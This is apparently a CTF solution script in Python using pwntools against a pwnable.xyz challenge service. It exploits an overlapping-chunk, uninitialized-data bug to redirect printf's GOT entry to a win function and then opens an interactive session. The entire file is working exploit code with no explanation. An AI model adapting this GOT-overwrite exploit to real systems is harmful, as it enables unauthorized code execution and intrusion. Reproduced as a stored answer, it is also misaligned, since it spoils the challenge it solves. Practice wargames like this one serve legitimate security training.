###Overlapping chunk, uninitialized data, strange memory referencing logic

from pwn import *

###Util
def create(data,num):
    r.sendlineafter('> ','1')
    r.sendafter('Name: ',data)
    r.sendafter('Age: ',str(num))

def edit(data,num):
    r.sendlineafter('> ','3')
    r.sendafter('Name: ',data)
    r.sendafter('Age: ',num)

###Addr
printf_got = 0x602030
win = 0x400b71

###Exploit
r = remote('svc.pwnable.xyz',30011)
create('M30W',0)
edit('M30W',b'a'*0x10+p64(printf_got))
r.sendlineafter('> ','3')
r.sendafter('Name: ',p64(win))
r.interactive()
